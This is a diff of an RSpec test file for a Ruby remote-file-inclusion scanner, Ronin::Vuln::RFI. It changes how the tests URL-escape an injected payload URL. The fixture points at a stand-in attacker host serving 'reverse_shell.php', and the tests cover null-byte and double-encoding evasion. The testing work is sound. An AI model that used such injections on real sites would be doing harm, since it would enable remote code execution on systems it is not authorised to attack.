@@ -99,11 +99,11 @@ describe Ronin::Vuln::RFI do
   let(:rfi_url) { 'http://evil.com/reverse_shell.php' }
 
   describe "#url_for" do
-    let(:uri_encoded_rfi_url) { URI.encode_www_form_component(rfi_url) }
+    let(:uri_escaped_rfi_url) { URI::QueryParams.escape(rfi_url) }
 
     it "must replace the vulnerable param with the RFI script" do
       expect(subject.url_for(rfi_url)).to eq(
-        URI("https://example.com/page.php?q=foo&#{param}=#{uri_encoded_rfi_url}")
+        URI("https://example.com/page.php?q=foo&#{param}=#{uri_escaped_rfi_url}")
       )
     end
 
@@ -112,7 +112,7 @@ describe Ronin::Vuln::RFI do
 
       it "must append %00 to the RFI URL" do
         expect(subject.url_for(rfi_url)).to eq(
-          URI("https://example.com/page.php?q=foo&#{param}=#{uri_encoded_rfi_url}%00")
+          URI("https://example.com/page.php?q=foo&#{param}=#{uri_escaped_rfi_url}%00")
         )
       end
     end
@@ -120,9 +120,13 @@ describe Ronin::Vuln::RFI do
     context "when #evasion is :double_encode" do
       subject { described_class.new(url,param, evasion: :double_encode) }
 
-      it "must double-encode the RFI URL" do
+      let(:double_uri_escaped_rfi_url) do
+        URI::QueryParams.escape(uri_escaped_rfi_url)
+      end
+
+      it "must URI escape the RFI URL twice" do
         expect(subject.url_for(rfi_url)).to eq(
-          URI("https://example.com/page.php?q=foo&#{param}=#{URI.encode_www_form_component(uri_encoded_rfi_url)}")
+          URI("https://example.com/page.php?q=foo&#{param}=#{double_uri_escaped_rfi_url}")
         )
       end
     end
